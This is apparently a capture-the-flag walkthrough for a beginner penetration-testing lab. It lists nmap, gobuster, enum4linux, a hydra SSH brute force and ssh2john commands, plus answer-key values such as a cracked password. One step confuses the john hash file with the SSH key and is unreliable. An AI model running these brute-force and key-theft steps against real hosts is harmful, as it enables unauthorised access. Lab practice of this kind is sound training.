**use nmap -sS -A -p- *IP address* to scan for open ports**

PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

139/tcp  open  netbios-ssn

445/tcp  open  microsoft-ds

8009/tcp open  ajp13

## What is the name of the hidden directory on the web server(enter name without /)?

**use gobuster dir -u (ip) -w /usr/share/wordlists/dirb/common.txt to find for hidden directories:**

found /development 


## User brute-forcing to find the username & password

**use enum4linux -a (ip) to find for users:**

S-1-22-1-1000 Unix User\kay (Local User)

S-1-22-1-1001 Unix User\jan (Local User)

**use hydra with wordlist to crack password hydra -t 4 -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://(ip)**

## What is the username?

jan

## What is the password?

armando

## What service do you use to access the server(answer in abbreviation in all caps)?

SSH

## Enumerate the machine to find any vectors for privilege escalation

Once inside the user jan, find user kay and list all hidden files. unable to cat pass.bak file. Found a hidden .ssh directory and the private key (id_rsa) is found.

Copy entire private key into a file (hash) and use python program to hash the key: python ssh2john.py hash > sshkey


## What is the name of the other user you found(all lower case)?

kay

## If you have found another user, what can you do with this information?

use the new hash ssh key to login via ssh - ssh -i (path to hash ssh key) kay@(ip) this will enable to be log on as kay user and able to cat pass.bak file to find the final password

## What is the final password you obtain?
